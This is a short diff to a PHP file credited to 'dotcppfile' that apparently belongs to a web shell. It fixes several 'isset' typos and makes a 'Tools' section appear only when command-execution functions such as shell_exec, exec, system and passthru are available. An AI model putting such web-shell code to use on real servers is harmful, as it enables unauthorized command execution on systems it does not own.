@@ -1183,7 +1183,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				if(isset($get_first[2]))
 				{
 					$first = str_replace("\"", "", $get_first[2]);
-					if(isste($first[0]))
+					if(isset($first[0]))
 						echo "<td>".round(explode("\n", $first[0]))."% </td>";
 					else 
 						echo "N/A";
@@ -1208,7 +1208,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				if(isset($get_first[2]))
 				{
 					$first = str_replace("\"", "", $get_first[2]);
-					if(isste($first[0]))
+					if(isset($first[0]))
 						echo "<td>".round(explode("\n", $first[0]))."% </td>";
 					else 
 						echo "N/A";
@@ -1235,7 +1235,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				if(isset($get_first[2]))
 				{
 					$first = str_replace("\"", "", $get_first[2]);
-					if(isste($first[0]))
+					if(isset($first[0]))
 						echo "<td>".round(explode("\n", $first[0]))."% </td>";
 					else 
 						echo "N/A";
@@ -1283,7 +1283,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 				if(isset($get_first[2]))
 				{
 					$first = str_replace("\"", "", $get_first[2]);
-					if(isste($first[0]))
+					if(isset($first[0]))
 						echo "<td>".round(explode("\n", $first[0]))."% </td>";
 					else 
 						echo "N/A";
@@ -3678,8 +3678,12 @@ echo "
 				<td><input type='submit' value='Start' name='Start'/></td>
 			</tr>
 		</form>
-</table>
+</table>";
+}
 
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
+{
+echo "
 <br><h3><A NAME='Tools' href=\"#Tools\">Tools</A></h3>
 
 <table class='flat-table flat-table-1'>
